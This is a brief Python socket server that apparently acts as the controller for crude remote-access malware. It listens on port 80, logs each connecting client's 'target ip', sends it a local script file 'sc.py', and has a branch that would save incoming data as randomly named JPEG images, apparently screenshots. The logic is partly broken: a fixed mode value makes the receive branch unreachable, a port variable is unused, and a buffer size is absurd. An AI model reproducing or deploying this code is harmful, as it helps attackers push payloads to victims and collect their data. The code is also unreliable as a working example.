import socket
from random import choice
list = ['1','2','3','4','5','6','f','h','d','s']
rnd = choice(list)+choice(list)+choice(list)+choice(list)
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


host = socket.gethostname()
ip_address = socket.gethostbyname(host)
port = 9999
# Bind to the port
print(ip_address)
serversocket.bind((ip_address, 80))
# Listen for incoming connections
serversocket.listen(10)

#serversocket.send(b'1')
while True:
    req = '1'
    message = req
    print('Waiting for a connection...')
    clientsocket, addr = serversocket.accept()
    print('a client conected to me . . . ')
    clientsocket.send(message.encode('utf-8'))
    if req == '1':
        with open('sc.py','rb') as date:
            ip = clientsocket.recv(100000)
            print(f'your target ip is : {ip.decode()}')
            a = date.read()
            send = clientsocket.sendall(a)
            clientsocket.close()
    elif req == '2':
         ip=clientsocket.recv(100000)
         print(f'your target ip is : {ip.decode()}')
         data = clientsocket.recv(9990000009)
         with open(f'{rnd}.jpg','wb') as f:
            f.write(data)
            f.close()
            clientsocket.close()

    # Receive image data from client
    #data = clientsocket.recv(1000000000)

    # Save the image data to file
    #with open('new.jpg', 'wb') as f:
        #f.write(data)

    #print('Image received and saved to file')

    # Close the connection with the client
    clientsocket.close()